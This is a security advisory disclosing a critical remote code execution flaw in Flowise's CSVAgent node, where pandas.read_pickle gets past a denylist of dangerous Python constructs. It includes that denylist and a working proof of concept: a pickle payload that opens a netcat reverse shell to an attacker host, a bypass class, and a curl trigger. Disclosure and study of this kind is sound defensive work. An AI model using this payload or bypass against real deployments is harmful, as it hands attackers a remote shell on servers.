# [C] Flowise: Remote Code Execution Vulnerability in CSVAgent

## Summary
Severity: Critical
Advisory: GHSA-x6vm-w76m-8j7g
CVE: CVE-2026-69256
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-x6vm-w76m-8j7g
Type: github-advisory

## Affected
- npm: `flowise-components` — affected >=0 <3.1.3
- npm: `flowise` — affected >=0 <3.1.3

## Details
### Summary

The CSVAgent node was observed to allow users to write Python code which gets executed via `pyodide`. The original intent was to allow users to utilise the `pandas` library for CSV processing. Although there is a denylist that checks for dangerous Python constructs from being passed in, `pandas` has a `read_pickle()` [function](https://pandas.pydata.org/docs/reference/api/pandas.read_pickle.html) that deserialises a pickled payload and this can be leveraged to achieve code execution.

### Details

The affected file is the `CSVAgent` node, found in: `flowise-components/nodes/agents/CSVAgent/CSVAgent.ts`.

```js
try {
    const code = `import pandas as pd
import base64
from io import StringIO
import json

base64_string = "${base64String}"

decoded_data = base64.b64decode(base64_string)

csv_data = StringIO(decoded_data.decode('utf-8'))

df = pd.${customReadCSVFunc} <1>
my_dict = df.dtypes.astype(str).to_dict()
print(my_dict)
json.dumps(my_dict)`
    dataframeColDict = await pyodide.runPythonAsync(code)
} catch (error) {
    throw new Error(error)
}
```

At <1>, the `customReadCSVFunc` is supplied by the user. This input goes through input validation that denies dangerous Python constructs from being passed in:

```py
const FORBIDDEN_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
    // Imports (the executor pre-imports pandas and numpy; LLM code must not add any imports)
    { pattern: /\bfrom\s+\S+\s+import\b/g, reason: 'import statement (from...import)' },
    { pattern: /\bimport\b/g, reason: 'import statement (all imports forbidden; pandas and numpy are pre-imported by the executor)' },
    // Dangerous builtins
    { pattern: /\beval\s*\(/g, reason: 'eval()' },
    { pattern: /\bexec\s*\(/g, reason: 'exec()' },
    { pattern: /\bcompile\s*\(/g, reason: 'compile()' },
    { pattern: /\b__import__\s*\(/g, reason: '__import__()' },
    { pattern: /\bopen\s*\(/g, reason: 'open()' },
    { pattern: /\bbreakpoint\s*\(/g, reason: 'breakpoint()' },
    { pattern: /\binput\s*\(/g, reason: 'input()' },
    { pattern: /\braw_input\s*\(/g, reason: 'raw_input()' },
    { pattern: /\bglobals\s*\(/g, reason: 'globals()' },
    { pattern: /\blocals\s*\(/g, reason: 'locals()' },
    { pattern: /\bgetattr\s*\(/g, reason: 'getattr()' },
    { pattern: /\bsetattr\s*\(/g, reason: 'setattr()' },
    { pattern: /\bdelattr\s*\(/g, reason: 'delattr()' },
    { pattern: /\breload\s*\(/g, reason: 'reload()' },
    { pattern: /\bfile\s*\(/g, reason: 'file()' },
    { pattern: /\bexecfile\s*\(/g, reason: 'execfile()' },
    // Dangerous modules / attributes
    { pattern: /\bos\./g, reason: 'os module' },
    { pattern: /\bsubprocess\./g, reason: 'subprocess module' },
    { pattern: /\bsys\./g, reason: 'sys module' },
    { pattern: /\bsocket\./g, reason: 'socket module' },
    { pattern: /\burllib\./g, reason: 'urllib module' },
    { pattern: /\brequests\./g, reason: 'requests module' },
    { pattern: /\b__builtins__\b/g, reason: '__builtins__' },
    { pattern: /\b__loader__\b/g, reason: '__loader__' },
    { pattern: /\b__spec__\b/g, reason: '__spec__' },
    { pattern: /\b__class__\b/g, reason: '__class__ (reflection)' },
    { pattern: /\b__subclasses__\s*\(/g, reason: '__subclasses__()' },
    { pattern: /\b__bases__\b/g, reason: '__bases__' },
    { pattern: /\b__mro__\b/g, reason: '__mro__' },
    { pattern: /\b__globals__\b/g, reason: '__globals__' },
    { pattern: /\b__code__\b/g, reason: '__code__' },
    { pattern: /\b__closure__\b/g, reason: '__closure__' },
    { pattern: /\bvars\s*\(/g, reason: 'vars()' },
    { pattern: /\bdir\s*\(/g, reason: 'dir()' },
    { pattern: /\b__dict__\b/g, reason: '__dict__ (attribute reflection)' },
    { pattern: /\b__module__\b/g, reason: '__module__ (module reflection)' }
]
```

However, by using `pandas.read_pickle()`, an attacker can achieve code execution without hitting any of the denied words.

### PoC

First, generate a pickled payload that performs an OS command (replace the IP and port with your listening IP and port):

```py
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh",))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

Run it and note the encoded payload to be used later:

```bash
$ python3 pickle-payload-poc.py

gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=
```

1. In the Flowise dashboard, navigate to Chatflows and create or modify an existing Chatflow.
2. Drag a "CSV Agent" node onto the canvas.
3. Click on "Additional Parameters" and fill in the following PoC:

```py
isnull("")
class MiniBytesIO:
    def __init__(self, b):
        self.data = b
        self.pos = 0
    def read(self, n=-1):
        if n == -1:
            n = len(self.data) - self.pos
        chunk = self.data[self.pos:self.pos+n]
        self.pos += n
        return chunk
    def readline(self, n=-1):
        if self.pos >= len(self.data):
            return b""
        next_nl = self.data.find(b"\\n", self.pos)
        if next_nl == -1:
            next_nl = len(self.data)
        if n != -1:
            next_nl = min(self.pos + n, next_nl)
        line = self.data[self.pos:next_nl+1]
        self.pos = next_nl + 1
        return line
pd.read_pickle(MiniBytesIO(base64.b64decode("gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=")))
```

The custom `MiniBytesIO` class  needs to be included in order to deserialise the pickled payload, since `read_pickle()` expects a "str, path object, or file-like object". This is because we cannot use `import` to import `BytesIO`, nor `open()` to write to disk and read, and entering a URL does not work due to `pyodide` not having raw socket capabilities.

Save the chatflow, and obtain the UUID of this chatflow from the URL `/canvas/<UUID>`.

Open a listening shell on your specified port from your listening host, and send a POST request to the chatflow to trigger it and achieve code execution:

```
$ curl -X POST http://<TARGET>/api/v1/prediction/<UUID>
```

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x6vm-w76m-8j7g
- https://github.com/FlowiseAI/Flowise/pull/6257
- https://github.com/FlowiseAI/Flowise/commit/c79fe56a6c249850e96bce9b4859f7a0083e4507
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
